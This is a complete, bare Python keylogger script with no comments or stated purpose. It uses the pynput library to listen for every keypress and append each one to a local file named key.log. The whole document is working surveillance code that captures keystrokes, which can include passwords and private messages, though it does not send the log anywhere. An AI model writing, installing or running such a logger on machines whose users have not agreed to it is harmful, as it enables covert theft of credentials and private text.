#!/usr/bin/env python3

from pynput.keyboard import Listener

def keypress(key):
    with open('key.log', 'a') as file:
        file.write(str(key) +'\n')

with Listener(on_press=keypress) as listener:
    listener.join()

